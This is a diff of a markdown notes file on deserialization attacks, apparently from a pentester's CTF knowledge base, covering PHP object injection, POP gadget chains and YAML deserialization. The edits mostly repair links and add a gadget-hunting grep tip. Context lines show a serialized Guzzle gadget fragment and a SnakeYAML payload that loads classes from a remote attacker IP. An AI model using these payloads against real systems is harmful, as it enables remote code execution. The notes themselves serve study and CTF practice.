@@ -71,7 +71,7 @@ Magic method used with **deserialization** (`unserialize()`, `__unserialize()`):
 
 ### Classis PHP Object Injection vulnerability
 
-Example from [Toxic](../../Play%20ground/CTFs/Toxic.md)
+Example from [Toxic](../../CTFs/Toxic.md)
 
 ```php
 <?php
@@ -122,6 +122,12 @@ The PoC cookie value would be something like this:
 ```
 
 ### Custom PHP Object Injection  chain
+
+>[!tip]
+>You can search for specific magic methods not implementing `__wakeup` protections with the following command:
+>```sh
+>$ grep -rl '__destruct' | xargs grep -L BadMethodCallException
+>```
 
 Class code and gadgets:
 ```php
@@ -223,6 +229,9 @@ When an application calls `unserialize($user_input)`, the PHP engine attempts to
 
 Because of the autoloader,  **every class** available in the project's dependencies becomes a potential candidate for a POP chain, even if the main application logic never uses that class.
 
+>[!tip]
+>If you can attach a debugger to the application, you can inspect which objects and classes are vailable: [Inspect available in-memory classes and objects](../Dev,%20scripting%20&%20OS/PHP.md#Inspect%20available%20in-memory%20classes%20and%20objects)
+
 Steps are:
 - You send a serialized object of a class from a third-party library (e.g., Guzzle, Monolog, or Symfony components).
 - PHP realizes the class is missing and calls the **Autoloader**.
@@ -259,7 +268,7 @@ a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"Guzz
 
 ### Bypass checks on serialized object exploiting parser differentials
 
-- [WAFfle-y Order](../../Play%20ground/CTFs/WAFfle-y%20Order.md)
+- [WAFfle-y Order](../../CTFs/WAFfle-y%20Order.md)
 
 ### PHAR deserialization
 
@@ -855,7 +864,7 @@ Further references:
 - [Swagger YAML Parser Vulnerability (CVE-2017-1000207 and CVE-2017-1000208)](https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/)
 - [Securing Our Home Labs: Frigate Code Review](../../Readwise/Articles/Madison%20Oliver%20-%20Securing%20Our%20Home%20Labs%20Frigate%20Code%20Review.md)
 
-Example from [Ophiuchi](https://www.notion.so/Ophiuchi-c77afe7fb3a2427f8a11b60265ed968b) 
+Example from [Ophiuchi](../../CTFs/Ophiuchi.md)
 
 ```yaml
 !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://10.10.14.24"]]]]
